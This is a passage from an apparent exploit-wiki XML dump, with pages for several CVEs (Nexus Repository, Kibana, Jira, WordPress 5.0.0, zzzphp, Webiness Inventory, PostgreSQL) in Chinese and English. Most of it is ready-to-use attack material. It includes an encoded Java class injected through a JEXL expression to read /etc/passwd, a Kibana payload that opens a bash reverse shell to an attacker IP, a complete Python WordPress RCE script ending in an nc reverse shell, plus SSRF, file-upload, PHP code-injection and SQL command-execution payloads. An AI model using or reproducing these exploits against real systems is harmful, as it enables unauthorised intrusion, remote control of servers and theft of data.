{"action": "coreui_Component", "type": "rpc", "tid": 8, "data": [{"sort": [{"direction": "ASC", "property": "name"}], "start": 0, "filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \ndefineClass.setAccessible(true);\nx=defineClass.invoke(\n    y,\n   'Exploit.Test234',\n    z.getBytes('latin1'),    0,\n    3054\n);x.getMethod('test', ''.class).invoke(null, 'cat /etc/passwd');'done!'}\n"}, {"property": "type", "value": "jexl"}], "limit": 50, "page": 1}], "method": "previewAssets"}

&lt;/pre&gt;</text>
      <sha1>p1wf3vwnzqqkjnso0sre5kq33wdyfmn</sha1>
    </revision>
    <revision>
      <id>6484</id>
      <parentid>6483</parentid>
      <timestamp>2021-07-08T06:27:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6484</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7796" sha1="c1l576co5zci69wz8kqipbo84v3or6y" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Nexus &lt; 3.14.0

==FOFA==
&lt;pre&gt;
app="Nexus-Repository-Manager"
&lt;/pre&gt;
&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:3--&gt;
任意上傳 jar包，發送請求包執行命令
&lt;/translate&gt;
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 7256
Connection: close

{"action": "coreui_Component", "type": "rpc", "tid": 8, "data": [{"sort": [{"direction": "ASC", "property": "name"}], "start": 0, "filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \ndefineClass.setAccessible(true);\nx=defineClass.invoke(\n    y,\n   'Exploit.Test234',\n    z.getBytes('latin1'),    0,\n    3054\n);x.getMethod('test', ''.class).invoke(null, 'cat /etc/passwd');'done!'}\n"}, {"property": "type", "value": "jexl"}], "limit": 50, "page": 1}], "method": "previewAssets"}

&lt;/pre&gt;</text>
      <sha1>c1l576co5zci69wz8kqipbo84v3or6y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-7609 kibana 未授權遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1343</id>
    <revision>
      <id>1683</id>
      <timestamp>2021-04-15T06:50:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== kibana&lt;6.6.0  ==POC== 將POC裡的反鏈IP地址換成自己的，然後在目標機器上的 Timelion 選項下將以下 POC 粘貼進去，點擊 Run 運行..."</comment>
      <origin>1683</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="458" sha1="ek94enlbld2robhzospypfgns1e9m8x" xml:space="preserve">==影響版本==
kibana&lt;6.6.0

==POC==
將POC裡的反鏈IP地址換成自己的，然後在目標機器上的 Timelion 選項下將以下 POC 粘貼進去，點擊 Run 運行
&lt;pre&gt;
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i &gt;&amp; /dev/tcp/10.10.20.166/8989 0&gt;&amp;1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
&lt;/pre&gt;

攻擊機器开启监听，点击 Canvas 即可觸發漏洞。</text>
      <sha1>ek94enlbld2robhzospypfgns1e9m8x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-8404 Webiness Inventory 2.3 - 'ProductModel' 任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>1637</id>
    <revision>
      <id>2041</id>
      <timestamp>2021-05-02T05:04:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; =========================================================================================== # Exploit Title: Webiness Inventory 2.3 - 'ProductModel' Arbitrary Fi..."</comment>
      <origin>2041</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1265" sha1="sherberr2srnvp1czb9atyb5cf89mz3" xml:space="preserve">==EXP==
&lt;pre&gt;
===========================================================================================
# Exploit Title: Webiness Inventory 2.3 - 'ProductModel' Arbitrary File Upload
# Dork: N/A
# Date: 10-02-2019
# Exploit Author: Mehmet EMIROGLU
# Vendor Homepage: https://sourceforge.net/projects/webinessinventory/files/
# Software Link: https://sourceforge.net/projects/webinessinventory/files/
# Version: 2.3
# Category: Webapps
# Tested on: Wamp64, Windows
# CVE: CVE-2019-8404
# Software Description: Small stock inventory managment application for web.
===========================================================================================
# POC:
# Sign in to admin panel. then go to the inventory tab.
  Switch to the products tab and create a new product.
  In product image, click the browse button and select a file.
  https://i.hizliresim.com/OvrOOn.jpg
  When you save the product, the script is loaded with the error file to
the server.
  for example service unvailable
  https://i.hizliresim.com/zjGqD4.jpg
  path to the file we uploaded
  https://i.hizliresim.com/XMbpp5.jpg
# http://localhost/[PATH]/runtime/ProductModel/[FILE]
===========================================================================================
            
&lt;/pre&gt;</text>
      <sha1>sherberr2srnvp1czb9atyb5cf89mz3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-8451 Jira未授權SSRF漏洞</title>
    <ns>0</ns>
    <id>1355</id>
    <revision>
      <id>1696</id>
      <timestamp>2021-04-15T13:38:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; GET /plugins/servlet/gadgets/makeRequest?url=http://10.206.1.8:8080@www.baidu.com HTTP/1.1 Host: 10.206.1.8:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla..."</comment>
      <origin>1696</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="535" sha1="30xd4ghnukusemmbwd8w08wbp92hu1z" xml:space="preserve">==POC==
&lt;pre&gt;
GET /plugins/servlet/gadgets/makeRequest?url=http://10.206.1.8:8080@www.baidu.com HTTP/1.1
Host: 10.206.1.8:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchangeb;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
X-Atlassian-Token: no-check
Connection: close
&lt;/pre&gt;</text>
      <sha1>30xd4ghnukusemmbwd8w08wbp92hu1z</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-8943 WordPress 5.0.0 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3220</id>
    <revision>
      <id>3757</id>
      <timestamp>2021-05-31T03:56:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== WordPress versions 5.0.0 and 4.9.8 and below remote code execution exploit that leverages path traversal and file inclusion vulnerabilities.  ==EXP== &lt;pre&gt; # Exploit..."</comment>
      <origin>3757</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5676" sha1="ioumn5j3o3uy3vk6snwwdhf2snh5du1" xml:space="preserve">==INFO==
WordPress versions 5.0.0 and 4.9.8 and below remote code execution exploit that leverages path traversal and file inclusion vulnerabilities.

==EXP==
&lt;pre&gt;
# Exploit Title: WordPress 5.0.0 - Image Remote Code Execution
# Date: 2020-02-01
# Exploit Authors: OUSSAMA RAHALI ( aka V0lck3r)
# Discovery Author : RIPSTECH Technology
# Version: WordPress 5.0.0 and &lt;= 4.9.8 .
# References : CVE-2019-89242 | CVE-2019-89242  | https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/

#/usr/bin/env python3

import requests
import re
import sys
from datetime import datetime

banner = """

__        __            _                           ____   ____ _____ 
\ \      / /__  _ __ __| |_ __  _ __ ___  ___ ___  |  _ \ / ___| ____|
 \ \ /\ / / _ \| '__/ _` | '_ \| '__/ _ \/ __/ __| | |_) | |   |  _|  
  \ V  V / (_) | | | (_| | |_) | | |  __/\__ \__ \ |  _ &lt;| |___| |___ 
   \_/\_/ \___/|_|  \__,_| .__/|_|  \___||___/___/ |_| \_\\____|_____|
                         |_|                                        
                               5.0.0 and &lt;= 4.9.8
"""
print(banner)
print("usage :")
print("=======")
usage = 'python3 RCE_wordpress.py http://&lt;IP&gt;:&lt;PORT&gt;/ &lt;Username&gt; &lt;Password&gt; &lt;WordPress_theme&gt;'
print(usage)

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
wp_theme = sys.argv[4] # wpscan results

lhost = '10.10.10.10' #attacker ip
lport = '4141' #listening port

date = str(datetime.now().strftime('%Y'))+'/'+str(datetime.now().strftime('%m'))+'/'

imagename = 'gd.jpg'
# ======
# Note :
# ======
# It could be any jpg image, BUT there are some modifications first : 
# 1- image name as : "gd.jpg"
# 2- place the image in the same directory as this exploit.
# 3- inject the php payload via exiftool : exiftool gd.jpg -CopyrightNotice="&lt;?=\`\$_GET[0]\`?&gt;"

data = {
  'log':username,
  'pwd':password,
  'wp-submit':'Log In',
  'redirect_to':url+'wp-admin/',
  'testcookie':1
}

r = requests.post(url+'wp-login.php',data=data)

if r.status_code == 200:
  print("[+] Login successful.\n")
else:
  print("[-] Failed to login.")
  exit(0)

cookies = r.cookies

print("[+] Getting Wp Nonce ... ")

res = requests.get(url+'wp-admin/media-new.php',cookies=cookies)
wp_nonce_list = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)

if len(wp_nonce_list) == 0 :
  print("[-] Failed to retrieve the _wpnonce \n")
  exit(0)
else :
  wp_nonce = wp_nonce_list[0]
  print("[+] Wp Nonce retrieved successfully ! _wpnonce : " + wp_nonce+"\n")

print("[+] Uploading the image ... ")

data = {
  'name': 'gd.jpg',
  'action': 'upload-attachment',
  '_wpnonce': wp_nonce
}

image = {'async-upload': (imagename, open(imagename, 'rb'))}
r_upload = requests.post(url+'wp-admin/async-upload.php', data=data, files=image, cookies=cookies)
if r_upload.status_code == 200:
  image_id = re.findall(r'{"id":(\d+),',r_upload.text)[0]
  _wp_nonce=re.findall(r'"update":"(\w+)"',r_upload.text)[0]
  print('[+] Image uploaded successfully ! Image ID :'+ image_id+"\n")
else : 
  print("[-] Failed to receive a response for uploaded image ! try again . \n")
  exit(0)

print("[+] Changing the path ... ")


data = {
  '_wpnonce':_wp_nonce,
  'action':'editpost',
  'post_ID':image_id,
  'meta_input[_wp_attached_file]':date+imagename+'?/../../../../themes/'+wp_theme+'/rahali'
}

res = requests.post(url+'wp-admin/post.php',data=data, cookies=cookies)
if res.status_code == 200:
  print("[+] Path has been changed successfully. \n")
else :
  print("[-] Failed to change the path ! Make sure the theme is correcte .\n")
  exit(0)

print("[+] Getting Ajax nonce ... ")

data = {
  'action':'query-attachments',
  'post_id':0,
  'query[item]':43,
  'query[orderby]':'date',
  'query[order]':'DESC',
  'query[posts_per_page]':40,
  'query[paged]':1
}

res = requests.post(url+'wp-admin/admin-ajax.php',data=data, cookies=cookies)
ajax_nonce_list=re.findall(r',"edit":"(\w+)"',res.text)

if res.status_code == 200 and len(ajax_nonce_list) != 0 :
  ajax_nonce = ajax_nonce_list[0]
  print('[+] Ajax Nonce retrieved successfully ! ajax_nonce : '+ ajax_nonce+'\n')
else :
  print("[-] Failed to retrieve ajax_nonce.\n")
  exit(0)


print("[+] Cropping the uploaded image ... ")

data = {
  'action':'crop-image',
  '_ajax_nonce':ajax_nonce,
  'id':image_id,
  'cropDetails[x1]':0,
  'cropDetails[y1]':0,
  'cropDetails[width]':200,
  'cropDetails[height]':100,
  'cropDetails[dst_width]':200,
  'cropDetails[dst_height]':100
}

res = requests.post(url+'wp-admin/admin-ajax.php',data=data, cookies=cookies)
if res.status_code == 200:
  print("[+] Done . \n")
else :
  print("[-] Erorr ! Try again \n")
  exit(0)

print("[+] Creating a new post to include the image... ")

res = requests.post(url+'wp-admin/post-new.php', cookies=cookies)
if res.status_code == 200:
  _wpnonce = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)[0]
  post_id = re.findall(r'"post":{"id":(\w+),',res.text)[0]
  print("[+] Post created successfully . \n")
else :
  print("[-] Erorr ! Try again \n")
  exit(0)

data={
  '_wpnonce':_wpnonce,
  'action':'editpost',
  'post_ID':post_id,
  'post_title':'RCE poc by v0lck3r',
  'post_name':'RCE poc by v0lck3r',
  'meta_input[_wp_page_template]':'cropped-rahali.jpg'
}
res = requests.post(url+'wp-admin/post.php',data=data, cookies=cookies)
if res.status_code == 200:
  print("[+] POC is ready at : "+url+'?p='+post_id+'&amp;0=id\n')
  print("[+] Executing payload !")
  requests.get(f"{url}?p={post_id}&amp;0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{lhost}%20{lport}%20%3E%2Ftmp%2Ff",cookies=cookies)

else :
  print("[-] Erorr ! Try again (maybe change the payload) \n")
  exit(0)
&lt;/pre&gt;</text>
      <sha1>ioumn5j3o3uy3vk6snwwdhf2snh5du1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-9041 zzzphp CMS 1.6.1 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1627</id>
    <revision>
      <id>2031</id>
      <timestamp>2021-05-02T04:57:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: dynamic code evaluation of zzzphp cms 1.6.1  # Google Dork: intext:"2015-2019 zzcms.com"  # Date: 24/02/2019  # Exploit Author: Yang Chenglong..."</comment>
      <origin>2031</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1042" sha1="tui99yfdtkxtommg83nwdy6cdla3wtq" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: dynamic code evaluation of zzzphp cms 1.6.1

# Google Dork: intext:"2015-2019 zzcms.com"

# Date: 24/02/2019

# Exploit Author: Yang Chenglong

# Vendor Homepage: http://www.zzzcms.com/index.html

# Software Link: http://115.29.55.18/zzzphp.zip

# Version: 1.6.1

# Tested on: windows/Linux,iis/apache

# CVE : CVE-2019-9041

Due to the failure of filtering function parserIfLabel() in inc/zzz_template.php, attackers can insert dynamic php code into the template file and leads to dynamic code evaluation.

Exploit:
login in to the admin panel, edit the template of search.html, insert the following code:

{if:assert($_POST[x])}phpinfo();{end if}

Visit the http://webroot/search/ and post data “x = phpinfo();”, the page will execute the php code “phpinfo()” as follow:
[1.png]

Remarks:
While the above exploit requires attackers to have the access to the admin panel, I will post another exploit by using csrf to acquire the control of website without access to the admin panel.
            
&lt;/pre&gt;</text>
      <sha1>tui99yfdtkxtommg83nwdy6cdla3wtq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-9193 PostgreSQL 高權限命令執行漏洞</title>
    <ns>0</ns>
    <id>863</id>
    <revision>
      <id>1124</id>
      <timestamp>2021-04-07T11:43:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 啟動漏洞環境後， 將開啟Postgres默認的5432端口，默認賬號密碼為postgres/postgres..."</comment>
      <origin>1124</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="452" sha1="pvot5gfulz98tehtmra8v6k3yqfs0kj" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
啟動漏洞環境後， 將開啟Postgres默認的5432端口，默認賬號密碼為postgres/postgres， 連接到數據庫。
&lt;/translate&gt;
&lt;pre&gt;
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
&lt;/pre&gt;

&lt;translate&gt;
FROM PROGRAM語句將執行命令id並將結果保存在cmd_exec表中。
&lt;/translate&gt;</text>
      <sha1>pvot5gfulz98tehtmra8v6k3yqfs0kj</sha1>
    </revision>
    <revision>
      <id>1125</id>
      <parentid>1124</parentid>
      <timestamp>2021-04-07T11:43:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1125</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="485" sha1="pkqec11qf0y220e2x4i05jgk9nzwq58" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
